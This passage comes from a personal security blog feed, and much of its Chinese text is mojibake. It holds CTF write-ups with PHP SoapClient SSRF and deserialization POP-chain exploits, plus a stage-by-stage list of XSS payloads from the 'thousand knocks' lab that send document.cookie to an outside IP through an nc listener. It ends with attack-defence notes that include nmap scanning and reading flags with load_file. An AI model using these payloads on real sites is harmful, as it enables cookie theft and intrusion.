<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>
<p>è§„å®šlocalhostè®¿é—®,é‚£ä¹ˆå¿…é¡»è¦æ‰¾åˆ°ssrfçš„æœºä¼š.</p>
<p>é¢˜ç›®æç¤ºååºåˆ—åŒ–,ä½†æ˜¯é¢˜ç›®æºç ä¸­æ²¡æœ‰ä»»ä½•ç»™å®šçš„ç±»,åœ¨æ­¤æƒ…å†µä¸‹åªèƒ½è€ƒè™‘phpçš„åŸç”Ÿç±».æœ¬é¢˜é‡‡ç”¨çš„æ˜¯SoapClientç±».åœ¨è¿™ä¸ªç±»çš„å¯¹è±¡è°ƒç”¨æœªçŸ¥çš„æ–¹æ³•æ—¶å€™å°±ä¼šè°ƒç”¨callå‡½æ•°,åŒæ—¶è§¦å‘è¯·æ±‚,è¿™ä¸ªç±»æ”¯æŒhttp/https, ç®€å•çš„ä½¿ç”¨å®ä¾‹å¦‚ä¸‹:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">"http://127.0.0.1:12334/flag.php"</span>;</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'uri'</span> =&gt; $url, <span class="string">'location'</span> =&gt;$url));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$c = unserialize($a);</span><br><span class="line">$c-&gt;a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>nc æ¥å—:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/66317782-bc73c200-e94c-11e9-904b-6e9705595d94.png" alt="image"></p>
<p>é‚£ä¹ˆå¯ä»¥è¿™æ ·å­:</p>
<ul>
<li>call_user_func(â€˜session_startâ€™,â€˜serialize_handler=php_serializeâ€™)æå‰å¼€å¯php sessionå¹¶è§„å®šå¥½æœ¬åœ°çš„serialize_handlerä¸ºphp_serialize, è€Œé»˜è®¤çš„sessionåºåˆ—åŒ–å¤„ç†å™¨ä¸ºphp,è¿™å°±ä¼šå¯¼è‡´ä¸Šé¢è¯´åˆ°çš„sessionååºåˆ—åŒ–æ¼æ´.å½“ç„¶,nameçš„å€¼æ˜¯ç«–çº¿åŠ ä¸ŠSoapClientåºåˆ—åŒ–å­—ç¬¦ä¸²,uriå’Œlocationçš„å€¼éƒ½æŒ‡å‘flag.php</li>
<li>sessionå­˜å–å®Œæˆä¹‹åå°±è¦æƒ³åŠæ³•å»ååºåˆ—åŒ–å’Œè§¦å‘æœªçŸ¥æ–¹æ³•,è¿™é‡Œä½¿ç”¨å˜é‡è¦†ç›–(<strong>extract</strong>)å°†bè¦†ç›–ä¸ºcall_user_func,å› ä¸ºbæœ‰æœºä¼šæ¥å—sessionååºåˆ—åŒ–çš„å­—ç¬¦ä¸²,å¹¶å°†æ•°ç»„ä¼ å…¥bä¸­,è°ƒç”¨welcome_to_the_lctf2018æ–¹æ³•,ä»è€Œè§¦å‘callå‡½æ•°,é€ æˆssrf</li>
<li>æœ€å<strong>ssrfçš„ç»“æœä¹Ÿä¼šå­˜æ”¾åœ¨sessoinä¸­</strong>,æ‰€ä»¥è·å–SoapClientçš„PHPSSIDå¹¶å»è®¿é—®index.php(é‡Œé¢æœ‰var_dump(session))å¾—åˆ°flag</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/40637063/66320601-baf8c880-e951-11e9-8a3f-1bf39a2f08ed.png" alt="1570458197732"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/66320574-a7e5f880-e951-11e9-9f5f-05bddd51af9b.png" alt="1570458295931"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/66320472-78cf8700-e951-11e9-85b2-8f9b18fc9b9d.png" alt="image"></p>
<h2 id="SWPUCTF-2019-web6">SWPUCTF 2019 web6</h2>
<p>å‰é¢éƒ¨åˆ†çœç•¥, æ¥åˆ°æºç éƒ¨åˆ†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $s1 = <span class="keyword">$this</span>-&gt;&#123;$name&#125;;</span><br><span class="line">                    $s1();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($ke)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;mod2[$ke];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> $mod3;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="keyword">$this</span>-&gt;mod3.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">public</span> $flag;</span><br><span class="line">        <span class="keyword">public</span> $b;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                session_start(); </span><br><span class="line">                var_dump($_SESSION);</span><br><span class="line">                $a = <span class="keyword">array</span>(reset($_SESSION),<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">                <span class="keyword">echo</span> call_user_func(<span class="keyword">$this</span>-&gt;b,$a);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> $str2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;&#123;<span class="keyword">$this</span>-&gt;str2&#125;();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = $_POST[<span class="string">'aa'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ssrfç”Ÿæˆsessionååºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/interface.php'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: user=xZmdm9NxaQ=='</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target, <span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers),<span class="string">'uri'</span>=&gt;<span class="string">'aabb'</span>));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">// echo urlencode($a);</span></span><br></pre></td></tr></table></figure>
<p>åºåˆ—åŒ–ç”Ÿæˆ, è§¦å‘ååºåˆ—åŒ–åè¿›è€Œè§¦å‘sessionçš„ååºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$first = <span class="keyword">new</span> bb();</span><br><span class="line">$second = <span class="keyword">new</span> aa();</span><br><span class="line">$third = <span class="keyword">new</span> cc();</span><br><span class="line">$four = <span class="keyword">new</span> ee();</span><br><span class="line">$first -&gt;mod1 = $second;</span><br><span class="line">$third -&gt; mod1 = $four;</span><br><span class="line">$f = <span class="keyword">new</span> dd();</span><br><span class="line">$f-&gt;flag=<span class="string">'Get_flag'</span>;</span><br><span class="line">$f-&gt;b=<span class="string">'call_user_func'</span>;</span><br><span class="line">$four -&gt; str1 = $f;</span><br><span class="line">$four -&gt; str2 = <span class="string">"getflag"</span>;</span><br><span class="line">$second -&gt;mod2[<span class="string">'test2'</span>] = $third;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($first);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>PHPSESSIDéšä¾¿æŒ‡å®šå†™ä¸€ä¸ªæ¯”å¦‚kké»˜è®¤æƒ…å†µä¸‹ä¼šç”Ÿæˆsess_kk sessionæ–‡ä»¶</p>
</blockquote>
<p><img src="https://user-images.githubusercontent.com/40637063/70534832-dae97a00-1b96-11ea-9edf-1ce93b617b9d.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/70534582-54349d00-1b96-11ea-9028-3d08bb6c72c2.png" alt="image"></p>
<p>å‚è€ƒ</p>
<p><a href="https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://www.smi1e.top/lctf2018-bestphps-revenge-è¯¦ç»†é¢˜è§£/</a></p>
<p><a href="http://www.91ri.org15925.html" target="_blank" rel="noopener">http://www.91ri.org15925.html</a></p>
<p><a href="https://skysec.top/2017/08/16/jarvisoj-web/#PHPINFO" target="_blank" rel="noopener">https://skysec.top/2017/08/16/jarvisoj-web/#PHPINFO</a></p>
<p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p>
<p><a href="https://www.freebuf.com/vuls/202819.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/202819.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>xss-thousand-knocks</title>
    <url>/2019/04/22/xss-thousand-knocks/</url>
    <content><![CDATA[<h1>XSS-thousands-knocks</h1>
<p>before starting the test, connect to our vps and excute:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvkp 1234</span><br><span class="line"> l:listen;v:print information;vv:print information in detail;k:keep connecting;p:port</span><br></pre></td></tr></table></figure>
<h2 id="stage-1">stage 1</h2>
<p>just click the link and get the flag</p>
<h2 id="stage-2">stage 2</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-3">stage 3</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&quot;&gt;&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-4">stage 4</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&apos;&apos;&gt;&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-5">stage 5</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;/textarea&gt;&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-6">stage 6</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;/xmp&gt;&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-7">stage 7</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=xss&quot;+autofocus+onfocus=&quot;document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`</span><br></pre></td></tr></table></figure>
<h2 id="stage-8">stage 8</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=xss&apos;+autofocus+onfocus=&apos;document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`</span><br></pre></td></tr></table></figure>
<h2 id="stage-9">stage 9</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=xss+autofocus+onfocus=document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`</span><br></pre></td></tr></table></figure>
<h2 id="stage-10-11">stage 10 &amp; 11</h2>
<blockquote>
<p>çœŸåè®®ç”¨æ¥åœ¨è®¡ç®—æœºä¹‹é—´ä¼ è¾“æ•°æ®åŒ…ï¼Œå¦‚ http åè®®ï¼Œftp åè®®ï¼›ä¼ªåè®®æ˜¯ä¸€ç§éæ ‡å‡†åŒ–çš„åè®®ï¼Œè®©ä½¿ç”¨è€…å¯ä»¥é€šè¿‡é“¾æ¥æ¥è°ƒç”¨ js å‡½æ•°ã€‚</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=javascript:document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`</span><br></pre></td></tr></table></figure>
<h2 id="stage-12">stage 12</h2>
<blockquote>
<p>CSP contains â€˜unsafe-inlineâ€™</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=javascript:var xss=document.createlement(`link`);xss.setAttribute(`rel`,`prefetch`);xss.setAttribute(`href`,`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`);document.head.appendChild(xss);</span><br><span class="line">//é¡µé¢æ¸²æŸ“å®Œæ¯•ä¼šåˆ›å»º Link REL=prefetch çš„æ ‡ç­¾ï¼Œå‘ç›®æ ‡é¡µé¢å‘èµ·é¢„åŠ è½½</span><br></pre></td></tr></table></figure>
<h2 id="stage-13">stage 13</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q= &lt;svg onload=eval(atob(&apos;ZG9jdW1lbnQubG9jYXRpb249YGh0dHA6Ly8yMDcuMTQ4LjY0LjEyNDoxMjM0Lz8ke2RvY3VtZW50LmNvb2tpZX1g&apos;))&gt;</span><br><span class="line">//base64.b64encode(&apos;document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`&apos;)</span><br></pre></td></tr></table></figure>
<h2 id="stage-14">stage 14</h2>
<blockquote>
<p>CSP:frame-src http://*.knock.xss.moe</p>
</blockquote>
<p>using other stage to get the flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=XSS%20autofocus%20onfocus=document.domain=`knock.xss.moe`;window.open(`http://207.148.64:1234/?$&#123;parent.document.cookie&#125;`)</span><br><span class="line"></span><br><span class="line">//attention to &apos;domain=`knock.xss.moe`&apos; and &apos;parent.document.cookie&apos;</span><br></pre></td></tr></table></figure>
<h2 id="stage-15">stage 15</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;svg onload=document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-16-17">stage 16 &amp; 17</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=javascript:document.location=`http://207.148.64.125:1234/?$&#123;parent.document.cookie&#125;`</span><br></pre></td></tr></table></figure>
<h2 id="stage-18">stage 18</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=\%27);window.open(`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`)//</span><br><span class="line">q=\%27);window.open(`http://207.148.64.125:1234/?`%2bdocument.cookie)//</span><br></pre></td></tr></table></figure>
<h2 id="stage-19">stage 19</h2>
<blockquote>
<p>you can eval function in alert()</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=xxs&apos;,window.open(`http://207.148.74.125:1234/?$&#123;document.cookie&#125;`));//</span><br></pre></td></tr></table></figure>
<h2 id="stage-20">stage 20</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;scrscriptipt&gt;document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-21">stage 21</h2>
<blockquote>
<p>x-xss-protection:1;mode=block;,è¿™é‡Œä½¿ç”¨äº†XSSè¿‡æ»¤ï¼Œå¦‚æœæ£€æµ‹åˆ°æ”»å‡»ï¼Œå°±ä¼šæµè§ˆå™¨ä¼šé˜»æ­¢é¡µé¢æ¸²æŸ“</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;sCript&gt;docuscriptment.locscriptation=`http://url/?$&#123;document.cookie&#125;`&lt;/sCript&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-22">stage 22</h2>
<blockquote>
<p>length limit: consider <svg> first,and replace http:// to //,and convert ip to desimalism</svg></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;svg/onload=window.open(`//url(desimalism)/?$&#123;document.cookie&#125;`)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="stage-23-24">stage 23 &amp; 24</h2>
<blockquote>
<p>location.hash:get the anchor point(the content after â€˜#â€™) , which can be used to bypass the length limit</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;svg/onload=eval(location.hash.slice(1))&gt;#window.open(`//url/?$&#123;document.cookie&#125;`)</span><br></pre></td></tr></table></figure>
<h2 id="stage-25">stage 25</h2>
<p>this is extremely shortâ€¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">the index.php on my vps :</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.name=&quot;location.href=`url/?$&#123;parent.document.cookie&#125;`&quot;;</span><br><span class="line">location.href = &quot;http://8e67e39d7e01213d5551c696ef8641b625cc8dd7.knock.xss.moe/?q=&lt;svg/onload=eval(window.name)&gt;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">and followed by :</span><br><span class="line">http://2017.148.64.125/index.php</span><br></pre></td></tr></table></figure>
<h2 id="stage-26">stage 26</h2>
<p>ä¼šæŠŠè¾“å…¥å­—ç¬¦å…¨éƒ¨å¤§å†™åŒ–ï¼ŒåŸå…ˆçš„payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/?q=&lt;img src=&quot;x&quot; onerror=window.open(`http://134.175.33.164:1234/?$&#123;document.cookie&#125;`)&gt;</span><br></pre></td></tr></table></figure>
<p>å°†å…¶è¿›è¡Œhtmlå®ä½“ç¼–ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/?q=&lt;img src=&quot;x&quot; onerror=&amp;#x77;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x77;&amp;#x2e;&amp;#x6f;&amp;#x70;&amp;#x65;&amp;#x6e;&amp;#x28;&amp;#x60;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x33;&amp;#x34;&amp;#x2e;&amp;#x31;&amp;#x37;&amp;#x35;&amp;#x2e;&amp;#x33;&amp;#x33;&amp;#x2e;&amp;#x31;&amp;#x36;&amp;#x34;&amp;#x3a;&amp;#x31;&amp;#x32;&amp;#x33;&amp;#x34;&amp;#x2f;&amp;#x3f;&amp;#x24;&amp;#x7b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x7d;&amp;#x60;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure>
<p>ä¸ºäº†é˜²æ­¢äº•å·è¢«å½“ä½œæ˜¯é”šç‚¹ï¼Œå°†å…¶è¿›è¡Œurlencode</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/?q=&lt;img src=&quot;x&quot; onerror=%26%23%78%37%37%3b%26%23%78%36%39%3b%26%23%78%36%65%3b%26%23%78%36%34%3b%26%23%78%36%66%3b%26%23%78%37%37%3b%26%23%78%32%65%3b%26%23%78%36%66%3b%26%23%78%37%30%3b%26%23%78%36%35%3b%26%23%78%36%65%3b%26%23%78%32%38%3b%26%23%78%36%30%3b%26%23%78%36%38%3b%26%23%78%37%34%3b%26%23%78%37%34%3b%26%23%78%37%30%3b%26%23%78%33%61%3b%26%23%78%32%66%3b%26%23%78%32%66%3b%26%23%78%33%31%3b%26%23%78%33%33%3b%26%23%78%33%34%3b%26%23%78%32%65%3b%26%23%78%33%31%3b%26%23%78%33%37%3b%26%23%78%33%35%3b%26%23%78%32%65%3b%26%23%78%33%33%3b%26%23%78%33%33%3b%26%23%78%32%65%3b%26%23%78%33%31%3b%26%23%78%33%36%3b%26%23%78%33%34%3b%26%23%78%33%61%3b%26%23%78%33%31%3b%26%23%78%33%32%3b%26%23%78%33%33%3b%26%23%78%33%34%3b%26%23%78%32%66%3b%26%23%78%33%66%3b%26%23%78%32%34%3b%26%23%78%37%62%3b%26%23%78%36%34%3b%26%23%78%36%66%3b%26%23%78%36%33%3b%26%23%78%37%35%3b%26%23%78%36%64%3b%26%23%78%36%35%3b%26%23%78%36%65%3b%26%23%78%37%34%3b%26%23%78%32%65%3b%26%23%78%36%33%3b%26%23%78%36%66%3b%26%23%78%36%66%3b%26%23%78%36%62%3b%26%23%78%36%39%3b%26%23%78%36%35%3b%26%23%78%37%64%3b%26%23%78%36%30%3b%26%23%78%32%39%3b&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>é¢˜å‹è®°å½•</category>
      </categories>
  </entry>
  <entry>
    <title>Awdç¬”è®°[working]</title>
    <url>/2019/08/19/Awd%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="ç™»å½•">ç™»å½•</h2>
<p>å¯†é’¥è¿æ¥:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa(è¿™æ˜¯ç§é’¥) username@url</span><br></pre></td></tr></table></figure>
<p>åˆšè¿›å»æ˜¯homeç›®å½•,ä¸æ˜¯/var/www/html !!!</p>
<h2 id="å¼€å±€æ“ä½œ">å¼€å±€æ“ä½œ</h2>
<p>ä¿®æ”¹sshç”¨æˆ·å¯†ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç™»å½•ä¹‹åä½¿ç”¨passwd &#123;ç”¨æˆ·å&#125;</span><br></pre></td></tr></table></figure>
<p>æ•°æ®åº“å¼€å±€æ“ä½œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ•°æ®åº“å¤‡ä»½</span><br><span class="line">mysqldump -u [username] â€“p[password] [database_name] &gt; [dump_file.sql]</span><br><span class="line">æ•°æ®åº“æœ¬åœ°æ¢å¤</span><br><span class="line">mysql -u [username] â€“p[password] [database_name] &lt; [dump_file.sql]</span><br><span class="line">æ•°æ®åº“è¿œç¨‹æ¢å¤</span><br><span class="line"> mysql â€“h [hostname] â€“u [username] â€“p[password] [database_name] &lt; [dump_file.sql]</span><br><span class="line">ä¿®æ”¹æ•°æ®åº“ç”¨æˆ·å¯†ç </span><br><span class="line">set password for [username]@localhost=password(&apos;xxxxx&apos;);</span><br></pre></td></tr></table></figure>
<p>å¤‡ä»½ç½‘ç«™æºä»£ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ‰“åŒ…å‹ç¼©</span><br><span class="line">tar -czf source.tar.gz souce_code_folder</span><br><span class="line">åœ¨å½“å‰ç›®å½•ä¸‹è§£å‹ç½‘ç«™æºä»£ç </span><br><span class="line">tar -xzf source.tar.gz</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨scpæˆ–è€…rsyncæ¥ä¼ è¾“æ–‡ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -r root@207.148.64.125:/home/ch4ser/blog/hexo/ ./</span><br><span class="line">scp root@207.148.64.125:/home/ch4ser/blog/hexo/_config.yml ./</span><br><span class="line">scp filename root@207.148.64.125:</span><br><span class="line">scp filename root@207.148.64.125:Document/</span><br><span class="line">scp -r folder root@207.148.64.125:Document/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> the method below is more functional</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="string">'a'</span> means digui-translation, <span class="string">'v'</span> means output the information generated during the transformation. <span class="string">'z'</span> means compare the transforming files with the <span class="built_in">local</span> file so that no duplicate and useless effort will be <span class="keyword">done</span>.</span></span><br><span class="line">rsync -avz root@207.148.64.125:/home/ch4ser/blog/hexo/ ./</span><br><span class="line">rsync -avz folder root@207.148.64.125:/Document</span><br></pre></td></tr></table></figure>
<h2 id="æµé‡ç›‘æ§å’Œå…³é”®å­—è¿‡æ»¤waf-php">æµé‡ç›‘æ§å’Œå…³é”®å­—è¿‡æ»¤waf.php</h2>
<p>Done</p>
<h2 id="å›æ˜¾flagè‡ªåŠ¨æ›¿æ¢">å›æ˜¾flagè‡ªåŠ¨æ›¿æ¢</h2>
<p>Done</p>
<h2 id="åƒåœ¾æµé‡ç”Ÿæˆ">åƒåœ¾æµé‡ç”Ÿæˆ</h2>
<p>Done</p>
<h2 id="ä¸»æœºå‘ç°">ä¸»æœºå‘ç°</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- url</span><br><span class="line">nmap -A -p- url</span><br><span class="line">python3 dirsearch.py -u &#123;url&#125; -e php</span><br></pre></td></tr></table></figure>
<h2 id="é˜²å¾¡ä¾¦å¯Ÿ">é˜²å¾¡ä¾¦å¯Ÿ</h2>
<p>åœ¨æ–‡ä»¶å¤¹ä¸­æœç´¢æŸä¸ªå…³é”®å­—(eval, system, execâ€¦ ),æ‰¾åˆ°ä¸€å¥è¯åé—¨ä¹‹åç«‹å³åˆ é™¤.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -r &quot;eval&quot; /var/www/html</span><br></pre></td></tr></table></figure>
<p>æŸ¥æ‰¾è¢«ä¿®æ”¹çš„phpæ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æŸ¥æ‰¾24å°æ—¶ä¹‹å†…ä¿®æ”¹çš„æ–‡ä»¶</span><br><span class="line">find ./ -mtime -0 -name &quot;*.php&quot;</span><br><span class="line">æŸ¥æ‰¾10åˆ†é’Ÿå†…è¢«ä¿®æ”¹çš„æ–‡ä»¶</span><br><span class="line">find ./ -mmin -10 -name &quot;*.php&quot;</span><br></pre></td></tr></table></figure>
<h2 id="flagè¯»å–">flagè¯»å–</h2>
<p>mysql è¯»å–flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&apos;/flag&apos;);</span><br></pre></td></tr></table></figure>
<h2 id="Phpstorm-æœç´¢é—œéµå­—-working">Phpstorm æœç´¢é—œéµå­—(working)</h2>
